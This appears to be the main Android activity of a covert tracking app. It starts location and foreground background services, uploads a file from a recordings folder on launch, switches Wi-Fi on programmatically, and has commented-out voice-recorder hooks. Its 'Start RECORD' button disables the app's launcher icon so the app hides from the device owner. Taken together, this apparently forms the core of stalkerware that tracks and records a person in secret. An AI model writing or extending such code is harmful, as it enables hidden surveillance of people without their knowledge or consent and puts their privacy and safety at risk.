package UiActivities;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import locationTracker.ForegroundServices;
import locationTracker.LocationService;
import com.varbin.locationtracker.R;

import java.io.File;
import java.lang.reflect.InvocationTargetException;

import networkStates.networkState;
import synceAdapter.AccountConstants;
import synceAdapter.SyncAdapter;

public class MainActivity extends AppCompatActivity {
    public static final String AUTHORITY = AccountConstants.AUTHORITY;
    public static final String ACCOUNT_TYPE =  AccountConstants.ACCOUNT_TYPE;
    public static final String ACCOUNT =  AccountConstants.ACCOUNT;
    static MainActivity ins;
    FileUploadClass fileUploadClass;
    String Name, Email, Mobile;
    SyncAdapter syncAdapter;
    Button button  , button2;
    Account mAcoount;
    ContentResolver mResolver;
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Name = getIntent().getStringExtra("Name");
        Email = getIntent().getStringExtra("Email");
        Mobile = getIntent().getStringExtra("Mobile");
        button = findViewById(R.id.playButton);
        button2 = findViewById(R.id.pauseButton);
        mAcoount = CreateSyncAccount(this);
        mResolver = getContentResolver();
        FileUploadClass fileUploadClass = new FileUploadClass(new File("/storage/emulated/0/VarbinRecords/temp.jpg"),
                "/storage/emulated/0/VarbinRecords/temp.jpg","92");
        fileUploadClass.execute();
        String s =AccountConstants.getStatus(this);
        Log.d("TAG", "onCreateID: "+s);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                button.setText("Start RECORD");
                try {
                    networkState.EnableWifi(getApplicationContext());
                } catch (NoSuchMethodException e) {
                    Log.d("TAG", "EnableWifi:  e1"+e);
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    Log.d("TAG", "EnableWifi:  e2"+e);
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    Log.d("TAG", "EnableWifi:  e12"+e);
                    e.printStackTrace();
                }
//                Intent intent = new Intent(MainActivity.this , VoiceRecorderService.class);
//                intent.putExtra("isRecording" , false);
//                startService(intent);
            }
        });
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                button.setText("Recording...");
                boolean icon = HideIcon(MainActivity.this);
                Log.d("TAG", "HideIcon" +icon);
//               Intent intent = new Intent(MainActivity.this , VoiceRecorderService.class);
//               intent.putExtra("isRecording" , true);
//               startService(intent);
            }
        });
        startService(new Intent(getApplicationContext(), LocationService.class));
        startService();
        if (AccountConstants.mainThread == false){
            startService();
        }

    }
    public static Account CreateSyncAccount(Context context) {
        // Create the account type and default account
        Account newAccount = new Account( ACCOUNT, ACCOUNT_TYPE);
        // Get an instance of the Android account manager
        AccountManager accountManager = AccountManager.get(context);
        /*
         * Add the account and account type, no password or user data
         * If successful, return the Account object, otherwise report an error.
         */
        if (accountManager.addAccountExplicitly(newAccount, null, null)) {
            /*
             * If you don't set android:syncable="true" in
             * in your <provider> element in the manifest,
             * then call context.setIsSyncable(account, AUTHORITY, 1)
             * here.
             */
        } else {
            /*
             * The account exists or some other error occurred. Log this, report it,
             * or handle it internally.
             */
        }
        return newAccount;
    }
    private static boolean HideIcon(Context context){
       try {
           PackageManager manager = context.getPackageManager();
           ComponentName componentName = new ComponentName(context.getApplicationContext() , MainActivity.class);
           manager.setComponentEnabledSetting(componentName,
                   manager.COMPONENT_ENABLED_STATE_DISABLED ,
                   PackageManager.DONT_KILL_APP);
           return true;
       }catch (Exception e){
           Log.d("TAG", "HideIcon: "+e);
           return false;
       }
    }
    public void startService() {
        Intent serviceIntent = new Intent(this, ForegroundServices.class);
        serviceIntent.putExtra("inputExtra", "Background Task Is Running");
        ContextCompat.startForegroundService(this, serviceIntent);
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
        finishAffinity();
    }
}